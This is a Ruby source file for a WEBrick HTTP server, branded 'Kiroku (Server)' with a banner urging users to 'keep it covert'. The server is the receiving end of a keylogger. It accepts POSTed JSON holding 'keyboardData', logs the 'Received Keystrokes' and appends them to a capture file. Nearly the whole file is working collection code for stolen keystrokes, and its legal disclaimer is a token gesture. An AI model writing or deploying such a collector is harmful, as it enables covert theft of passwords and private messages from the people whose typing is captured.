=begin
   ▄█   ▄█▄  ▄█     ▄████████  ▄██████▄     ▄█   ▄█▄ ███    █▄
  ███ ▄███▀ ███    ███    ███ ███    ███   ███ ▄███▀ ███    ███
  ███▐██▀   ███▌   ███    ███ ███    ███   ███▐██▀   ███    ███
 ▄█████▀    ███▌  ▄███▄▄▄▄██▀ ███    ███  ▄█████▀    ███    ███
▀▀█████▄    ███▌ ▀▀███▀▀▀▀▀   ███    ███ ▀▀█████▄    ███    ███
  ███▐██▄   ███  ▀███████████ ███    ███   ███▐██▄   ███    ███
  ███ ▀███▄ ███    ███    ███ ███    ███   ███ ▀███▄ ███    ███
  ███   ▀█▀ █▀     ███    ███  ▀██████▀    ███   ▀█▀ ████████▀  (Server)
  ▀                ███    ███              ▀
                                                   Zephyr

Pro Tip: Keep it clean, keep it covert. Always ensure your actions align with legal boundaries and ethical standards. Use responsibly, and stay sharp:>>
=end

require 'webrick'
require 'json'
require 'logger'

class MyServlet < WEBrick::HTTPServlet::AbstractServlet
  def initialize(server, file_path)
    super(server)
    @logger = Logger.new(STDOUT)
    @logger.level = Logger::INFO
    @file_path = file_path
  end

  def do_POST(request, response)
    begin
      post_data = request.body
      data = JSON.parse(post_data)
      keyboard_data = data['keyboardData'] || ''
      @logger.info("Received Keystrokes: #{keyboard_data}")
      save_capture_to_file(keyboard_data)
      response.status = 200
      response.content_type = 'application/json'
      response.body = { 'status' => 'success', 'message' => 'Data received and saved successfully' }.to_json
    rescue JSON::ParserError => e
      @logger.error("JSON parsing error: #{e.message}")
      response.status = 400
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Invalid JSON' }.to_json
    rescue StandardError => e
      @logger.error("Server error: #{e.message}")
      response.status = 500
      response.content_type = 'application/json'
      response.body = { 'status' => 'error', 'message' => 'Internal server error' }.to_json
    end
  end

  def save_capture_to_file(data)
    File.open(@file_path, 'a') do |file|
      data.scan(/.{1,30}/).each do |line|
        file.puts(line)
      end
    end
  end
end

port = 8080
file_path = 'saved_captures.txt'

logger = Logger.new(STDERR)
logger.level = Logger::INFO

server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []
server.mount '/', MyServlet, file_path

trap  'INT' do
  logger.info("Shutting down server...")
  server.shutdown
end

server.start
